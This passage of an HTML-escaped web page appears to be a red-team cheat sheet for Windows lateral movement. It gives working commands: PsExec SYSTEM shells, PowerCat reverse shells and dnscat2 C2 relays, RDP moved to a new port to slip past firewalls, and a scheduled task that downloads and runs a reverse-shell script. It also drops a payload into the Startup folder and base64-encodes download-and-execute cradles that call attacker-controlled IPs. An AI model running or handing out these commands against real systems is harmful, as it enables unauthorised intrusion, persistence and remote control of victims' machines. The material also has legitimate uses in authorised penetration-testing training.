&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Copy-Item&lt;/span> &lt;span class="n">-Path&lt;/span> &lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Users&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">user01&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Desktop&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">mimikatz&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">-Destination&lt;/span> &lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Users&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Public&lt;/span>&lt;span class="p">\&lt;/span> &lt;span class="n">-ToSession&lt;/span> &lt;span class="nv">$sess&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="psexec">PsExec&lt;/h2>
&lt;p>Launch a shell on the local machine as DIFFERENT user:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">psexec&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">-u&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\student1&amp;#34;&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="s2">&amp;#34;Password123.&amp;#34;&lt;/span> &lt;span class="n">-i&lt;/span> &lt;span class="n">-d&lt;/span> &lt;span class="n">cmd&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">psexec&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">-u&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\student1&amp;#34;&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="s2">&amp;#34;Password123.&amp;#34;&lt;/span> &lt;span class="n">-i&lt;/span> &lt;span class="n">-d&lt;/span> &lt;span class="n">powershell&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Launch a SYSTEM shell on the local machine:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">psexec&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">-s&lt;/span> &lt;span class="n">-i&lt;/span> &lt;span class="n">-d&lt;/span> &lt;span class="n">cmd&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">psexec&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">-s&lt;/span> &lt;span class="n">-i&lt;/span> &lt;span class="n">-d&lt;/span> &lt;span class="n">powershell&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>If you get the admin/password of a RID 500 user of a machine, it is possible to get a SYSTEM session on that machine by &lt;code>psexec&lt;/code>. It is also possible to use a &lt;code>cmd&lt;/code> or &lt;code>powershell&lt;/code> session launched from &lt;code>mimikatz&lt;/code> after Pass-The-Hash.&lt;/p>
&lt;p>Execute command in remote computer:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">psexec&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="p">\\&lt;/span>&lt;span class="n">COMPUTER1&lt;/span> &lt;span class="n">-u&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">USER&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">PASSWORD] [COMMAND&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Execute command ‘netstat -an’ in remote and output result in local computer:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">psexec&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="p">\\&lt;/span>&lt;span class="n">COMPUTER1&lt;/span> &lt;span class="n">-u&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">USER&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">PASSWORD&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="n">netstat&lt;/span> &lt;span class="n">-an&lt;/span> &lt;span class="p">&amp;gt;&lt;/span> &lt;span class="n">c:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">file&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">txt&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Execute command in remote and output result in remote:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">psexec&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="p">\\&lt;/span>&lt;span class="n">COMPUTER1&lt;/span> &lt;span class="n">-u&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">USER&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">PASSWORD&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="n">cmd&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">c&lt;/span> &lt;span class="n">netstat&lt;/span> &lt;span class="n">-an&lt;/span> &lt;span class="p">^&amp;gt;&lt;/span>&lt;span class="n">c:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">file&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">txt&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Execute program to interact with user:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">psexec&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="p">\\&lt;/span>&lt;span class="n">COMPUTER1&lt;/span> &lt;span class="n">-u&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">USER&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">PASSWORD&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="n">-d&lt;/span> &lt;span class="n">-i&lt;/span> &lt;span class="n">notepad&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Run remote shell:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">psexec&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="p">\\&lt;/span>&lt;span class="n">COMPUTER1&lt;/span> &lt;span class="n">-u&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">USER&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">PASSWORD&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="n">cmd&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="powercat">PowerCat&lt;/h2>
&lt;p>Import the PowerCat module:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">powercat&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Listen on port 8000 and print the output to the console. Rememeber to add -t (timeout) parameter: number of seconds to wait before giving up on listening or connecting:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">powercat&lt;/span> &lt;span class="n">-l&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="mf">8000&lt;/span> &lt;span class="n">-t&lt;/span> &lt;span class="mf">1000&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Connect to 10.1.1.1 port 443, send a shell, and enable verbosity:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">powercat&lt;/span> &lt;span class="n">-c&lt;/span> &lt;span class="mf">10.1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="mf">443&lt;/span> &lt;span class="n">-e&lt;/span> &lt;span class="n">cmd&lt;/span> &lt;span class="n">-v&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Connect to 10.1.1.1 port 443, execute a pseudo Powershell session, and enable verbosity:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">powercat&lt;/span> &lt;span class="n">-c&lt;/span> &lt;span class="mf">10.1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="mf">443&lt;/span> &lt;span class="n">-ep&lt;/span> &lt;span class="n">-v&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Send a file to 10.1.1.15 port 8000:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">powercat&lt;/span> &lt;span class="n">-c&lt;/span> &lt;span class="mf">10.1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">15&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="mf">8000&lt;/span> &lt;span class="n">-i&lt;/span> &lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">inputfile&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Write the data sent to the local listener on port 4444 to C::&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">powercat -l -p 4444 -of C:\outfile
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Listen on port 8000 and repeatedly server a powershell shell:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">powercat&lt;/span> &lt;span class="n">-l&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="mf">8000&lt;/span> &lt;span class="n">-ep&lt;/span> &lt;span class="n">-rep&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Relay traffic coming in on port 8000 over tcp to port 9000 on 10.1.1.1 over tcp:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">powercat&lt;/span> &lt;span class="n">-l&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="mf">8000&lt;/span> &lt;span class="n">-r&lt;/span> &lt;span class="n">tcp&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">10.1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mf">1&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">9000&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Connect to the dnscat2 server on c2.example.com, and send dns queries to the dns server on 10.1.1.1 port 53 (Get the server here: &lt;a href="https://github.com/iagox86/dnscat2%29" target="_blank" rel="noopener">https://github.com/iagox86/dnscat2)&lt;/a>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">powercat&lt;/span> &lt;span class="n">-c&lt;/span> &lt;span class="mf">10.1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="mf">53&lt;/span> &lt;span class="n">-dns&lt;/span> &lt;span class="n">c2&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">example&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">com&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Relay traffic coming in on port 8000 over tcp to the dnscat2 server on c2.example.com, sending queries to 10.1.1.1 port 53:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">powercat&lt;/span> &lt;span class="n">-l&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="mf">8000&lt;/span> &lt;span class="n">-r&lt;/span> &lt;span class="n">dns&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">10.1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mf">1&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">53&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">c2&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">example&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">com&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>(-d) Disconnect. powercat will disconnect after the connection is established and the input from -i is sent. Used for scanning.&lt;/p>
&lt;p>Generate Payload. Returns a script as a string which will execute the powercat with the options you have specified. -i, -d, and -rep will not be incorporated:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">powercat&lt;/span> &lt;span class="n">-c&lt;/span> &lt;span class="mf">10.1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="mf">443&lt;/span> &lt;span class="n">-ep&lt;/span> &lt;span class="n">-g&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Generate Encoded Payload. Does the same as -g, but returns a string which can be executed in this way: powershell -E&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">powercat&lt;/span> &lt;span class="n">-c&lt;/span> &lt;span class="mf">10.1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="mf">443&lt;/span> &lt;span class="n">-ep&lt;/span> &lt;span class="o">-ge&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Basic TCP Port Scanner:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="mf">21&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mf">22&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mf">80&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mf">443&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="n">powercat&lt;/span> &lt;span class="n">-c&lt;/span> &lt;span class="mf">10.1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">10&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="nv">$_&lt;/span> &lt;span class="n">-t&lt;/span> &lt;span class="mf">1&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-d&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Start A Persistent Server That Serves a File:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">powercat&lt;/span> &lt;span class="n">-l&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="mf">443&lt;/span> &lt;span class="n">-i&lt;/span> &lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">inputfile&lt;/span> &lt;span class="n">-rep&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="remote-desktop">Remote Desktop&lt;/h2>
&lt;p>Enable RDP on a machine:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-ItemProperty&lt;/span> &lt;span class="n">-Path&lt;/span> &lt;span class="s1">&amp;#39;HKLM:\System\CurrentControlSet\Control\Terminal Server&amp;#39;&lt;/span> &lt;span class="n">-name&lt;/span> &lt;span class="s2">&amp;#34;fDenyTSConnections&amp;#34;&lt;/span> &lt;span class="n">-value&lt;/span> &lt;span class="n">0Enable-NetFirewallRule&lt;/span> &lt;span class="n">-DisplayGroup&lt;/span> &lt;span class="s2">&amp;#34;Remote Desktop&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Change RDP port to 55555 (in order to bypass firewalls):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-ItemProperty&lt;/span> &lt;span class="n">-Path&lt;/span> &lt;span class="s2">&amp;#34;HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\&amp;#34;&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="n">PortNumber&lt;/span> &lt;span class="n">-Value&lt;/span> &lt;span class="mf">55555&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">New-NetFirewallRule&lt;/span> &lt;span class="n">-DisplayName&lt;/span> &lt;span class="s2">&amp;#34;New RDP Port 55555&amp;#34;&lt;/span> &lt;span class="n">-Direction&lt;/span> &lt;span class="n">Inbound&lt;/span> &lt;span class="n">-LocalPort&lt;/span> &lt;span class="mf">55555&lt;/span> &lt;span class="n">-Protocol&lt;/span> &lt;span class="n">TCP&lt;/span> &lt;span class="n">-Action&lt;/span> &lt;span class="n">allow&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">New-NetFirewallRule&lt;/span> &lt;span class="n">-DisplayName&lt;/span> &lt;span class="s2">&amp;#34;New RDP Port 55555&amp;#34;&lt;/span> &lt;span class="n">-Direction&lt;/span> &lt;span class="n">Inbound&lt;/span> &lt;span class="n">-LocalPort&lt;/span> &lt;span class="mf">55555&lt;/span> &lt;span class="n">-Protocol&lt;/span> &lt;span class="n">UDP&lt;/span> &lt;span class="n">-Action&lt;/span> &lt;span class="n">allow&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">net&lt;/span> &lt;span class="n">stop&lt;/span> &lt;span class="n">termservice&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">ynet&lt;/span> &lt;span class="nb">start &lt;/span>&lt;span class="n">termservice&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">y&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="scheduled-tasks">Scheduled Tasks&lt;/h2>
&lt;p>Launch a scheduled task on a remote host to download and execute the script for a reverse shell:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># File share via Web Server&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">schtasks&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">delete&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">S&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER01&amp;#34;&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">TN&lt;/span> &lt;span class="s2">&amp;#34;JAVA_CHECK&amp;#34;&lt;/span>&lt;span class="n">schtasks&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">create&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">S&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER01&amp;#34;&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="nb">SC &lt;/span>&lt;span class="n">Minute&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">RU&lt;/span> &lt;span class="s2">&amp;#34;NT Authority\SYSTEM&amp;#34;&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">TN&lt;/span> &lt;span class="s2">&amp;#34;JAVA_CHECK&amp;#34;&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">TR&lt;/span> &lt;span class="s2">&amp;#34;powershell.exe -ep bypass -c &amp;#39;iex (New-Object Net.WebClient).DownloadString(&amp;#39;&amp;#39;http://192.168.50.53/powercat_connect.ps1&amp;#39;&amp;#39;&amp;#39;)&amp;#39;&amp;#34;&lt;/span>&lt;span class="n">schtasks&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">run&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">S&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER01&amp;#34;&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">TN&lt;/span> &lt;span class="s2">&amp;#34;JAVA_CHECK&amp;#34;&lt;/span>&lt;span class="c"># File share via SMBNew-SmbShare -Path c:\users\student01\Desktop\shared -Name shared -FullAccess Everyoneschtasks /delete /S &amp;#34;COMPUTER01&amp;#34; /TN &amp;#34;JAVA_CHECK&amp;#34;# Only domain users can access the file share.# To run as SYSTEM the file must reside on the remote machine.schtasks /create /S &amp;#34;COMPUTER01&amp;#34; /SC Minute /RU &amp;#34;CYBERLAB\Administrator&amp;#34; /TN &amp;#34;JAVA_CHECK&amp;#34; /TR &amp;#34;powershell.exe -ep bypass -c &amp;#39;. \\192.168.50.53\shared\powercat.ps1; powercat -c 192.168.50.53 -p 443 -e cmd&amp;#39;&amp;#34;schtasks /run /S &amp;#34;COMPUTER01&amp;#34; /TN &amp;#34;JAVA_CHECK&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="wmi">WMI&lt;/h2>
&lt;p>&lt;em>Requires ‘Host’ and ‘RPCSS’ SPNs&lt;/em>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-WmiMethod&lt;/span> &lt;span class="n">win32_process&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER01.CYBERLAB.LOCAL&amp;#34;&lt;/span> &lt;span class="n">-name&lt;/span> &lt;span class="n">create&lt;/span> &lt;span class="n">-argumentlist&lt;/span> &lt;span class="s2">&amp;#34;powershell.exe -e &lt;/span>&lt;span class="nv">$encodedCommand&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="file-download">File download&lt;/h2>
&lt;p>Simple download:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Any version&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">New-Object&lt;/span> &lt;span class="n">System&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Net&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">WebClient&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="py">DownloadFile&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;http://192.168.119.155/PowerUp.ps1&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;C:\Windows\Temp\PowerUp.ps1&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Powershell 4+&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## You can use &amp;#39;IWR&amp;#39; as a shorthand&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-WebRequest&lt;/span> &lt;span class="s2">&amp;#34;http://10.10.16.7/Incnspc64.exe&amp;#34;&lt;/span> &lt;span class="n">-OutFile&lt;/span> &lt;span class="s2">&amp;#34;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Incnspc64.exe&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Load file reflectively:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">IEX &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">New-Object&lt;/span> &lt;span class="n">Net&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">WebClient&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="py">DownloadString&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;http://10.10.16.7/PowerView.ps1&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Encode one-liner:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$command&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="s1">&amp;#39;IEX (New-Object Net.WebClient).DownloadString(&amp;#34;http://172.16.100.55/Invoke-PowerShellTcpRun.ps1&amp;#34;)&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$bytes&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">System.Text.Encoding&lt;/span>&lt;span class="p">]::&lt;/span>&lt;span class="n">Unicode&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">GetBytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$command&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$encodedCommand&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">Convert&lt;/span>&lt;span class="p">]::&lt;/span>&lt;span class="n">ToBase64String&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$bytes&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">powershell&lt;/span> &lt;span class="n">-EncodedCommand&lt;/span> &lt;span class="nv">$encodedCommand&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="smb-shares">SMB Shares&lt;/h2>
&lt;p>Create a SMB share:&lt;/p>
